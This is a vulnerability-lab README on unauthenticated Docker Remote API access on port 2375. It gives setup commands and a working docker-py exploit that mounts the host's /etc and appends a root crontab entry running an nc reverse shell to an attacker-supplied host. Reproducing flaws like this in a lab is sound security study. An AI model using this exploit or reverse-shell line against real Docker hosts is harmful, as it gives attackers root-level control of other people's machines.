# Docker Remote API Unauthorized Access Leads to Remote Code Execution

[中文版本(Chinese version)](README.zh-cn.md)

Docker is a platform-as-a-service solution that delivers software in packages called containers. The Docker daemon (dockerd) exposes a REST API that allows remote management of Docker containers, images, and other resources.

When the Docker daemon is configured to listen on a network port (typically TCP port 2375) without proper authentication mechanisms, attackers can gain unauthorized access to the Docker API. This vulnerability allows attackers to create, modify, and execute containers on the host system, potentially leading to remote code execution, data theft, and complete host system compromise.

- <https://docs.docker.com/engine/security/protect-access/>
- <https://tttang.com/archive/357/>

## Environment Setup

Execute the following command to start the vulnerable Docker environment:

```
docker compose build
docker compose up -d
```

After the environment is started, the Docker daemon will listen on port 2375 without any authentication requirements.

## Vulnerability Reproduction

The vulnerability can be exploited using Python with the docker-py library. The attack involves creating a new container that mounts the host's /etc directory, allowing an attacker to modify critical system files. In this example, we will demonstrate the vulnerability by adding a malicious crontab entry that creates a reverse shell.

First, install the required Python library:

```
pip install docker
```

Then create and run a Python script that exploits the vulnerability:

```python
import docker

client = docker.DockerClient(base_url='http://your-ip:2375/')
data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
```

The script creates a container that mounts the host's /etc directory and adds a reverse shell command to the root user's crontab. Within a minute, the cron daemon will execute the command, establishing a reverse shell connection to the attacker's machine.

The successful exploitation can be verified by receiving the reverse shell connection:

![Reverse Shell Exploitation](1.png)

This vulnerability demonstrates the critical importance of properly securing Docker daemon access and implementing authentication mechanisms for remote API endpoints.
